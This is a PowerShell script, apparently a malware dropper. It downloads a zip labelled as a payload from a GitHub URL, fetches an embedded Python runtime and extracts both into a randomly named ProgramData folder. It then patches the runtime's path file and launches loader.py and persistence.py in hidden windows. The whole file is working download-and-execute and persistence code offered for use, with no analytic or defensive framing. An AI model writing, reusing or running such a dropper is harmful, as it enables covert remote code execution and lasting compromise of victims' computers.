
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

# ---------- Config ----------
$url       = 'https://github.com/putin22222/test/raw/refs/heads/main/lo.zip'
$pythonZip = 'https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip'

# ---------- Random folder under ProgramData ----------
$randName  = -join ((48..57) + (97..122) | Get-Random -Count 12 | ForEach-Object { [char]$_ })
$extractTo = Join-Path $env:ProgramData $randName
$zipPath   = Join-Path $extractTo 'lo.zip'
$pyZipPath = Join-Path $extractTo 'pyrt.zip'

New-Item -ItemType Directory -Path $extractTo -Force | Out-Null

# ---------- Download ----------
Write-Host "[*] Fetching payload..."
(New-Object Net.WebClient).DownloadFile($url, $zipPath)

Write-Host "[*] Fetching Python runtime..."
(New-Object Net.WebClient).DownloadFile($pythonZip, $pyZipPath)

# ---------- Extract both ----------
Expand-Archive -Path $zipPath   -DestinationPath $extractTo -Force
Expand-Archive -Path $pyZipPath -DestinationPath $extractTo -Force

Write-Host "[*] Extract dir: $extractTo"

# ---------- Locate REAL Python runtime ----------
$pythonExe = [string](
    Get-ChildItem $extractTo -Recurse -Filter 'python.exe' -ErrorAction SilentlyContinue |
    Where-Object {
        $_.Length -lt 200KB -and
        (Get-ChildItem $_.Directory -Filter 'python3*.dll' -ErrorAction SilentlyContinue)
    } |
    Select-Object -First 1 -ExpandProperty FullName
)

# ---------- Locate payload ----------
$pyScript = [string](
    Get-ChildItem $extractTo -Recurse -Filter 'loader.py' -ErrorAction SilentlyContinue |
    Select-Object -First 1 -ExpandProperty FullName
)

# ---------- Locate persistence script ----------
$persistScript = [string](
    Get-ChildItem $extractTo -Recurse -Filter 'persistence.py' -ErrorAction SilentlyContinue |
    Select-Object -First 1 -ExpandProperty FullName
)

if (-not $pythonExe) { Write-Error "No real Python runtime found"; return }
if (-not $pyScript)  { Write-Error "No loader.py found"; return }

# ---------- Patch ._pth next to REAL runtime ----------
$realPyDir = [string](Split-Path -Parent $pythonExe)
$pthFile   = Get-ChildItem $realPyDir -Filter 'python*._pth' | Select-Object -First 1

if ($pthFile) {
    $stdlibZip = Get-ChildItem $realPyDir -Filter 'python3*.zip' |
                 Select-Object -First 1 -ExpandProperty Name
    if (-not $stdlibZip) { $stdlibZip = 'python311.zip' }

@"
$stdlibZip
.
Lib\site-packages
import site
"@ | Out-File -FilePath $pthFile.FullName -Encoding ASCII
    Write-Host "[*] Patched: $($pthFile.FullName)"
}

$scriptDir = [string](Split-Path -Parent $pyScript)
Write-Host "[*] Python : $pythonExe"
Write-Host "[*] Script : $pyScript"

# ---------- Sanity check ----------
$ver = & $pythonExe --version 2>&1
if ($LASTEXITCODE -ne 0) {
    Write-Error "Python failed to launch: $ver (exit $LASTEXITCODE)"
    return
}
Write-Host "[*] Version: $ver"

# ---------- Execute loader ----------
$p = Start-Process -FilePath $pythonExe `
                   -ArgumentList @($pyScript) `
                   -WorkingDirectory $scriptDir `
                   -WindowStyle Hidden `
                   -PassThru

Write-Host "[*] Loader PID: $($p.Id)"

# ---------- Execute persistence (with folder argument) ----------
if ($persistScript) {
    Write-Host "[*] Persistence: $persistScript"

    $pp = Start-Process -FilePath $pythonExe `
                        -ArgumentList @($persistScript, $extractTo) `
                        -WorkingDirectory (Split-Path -Parent $persistScript) `
                        -WindowStyle Hidden `
                        -PassThru

    Write-Host "[*] Persistence PID: $($pp.Id)"
} else {
    Write-Host "[!] persistence.py not found in archive"
}
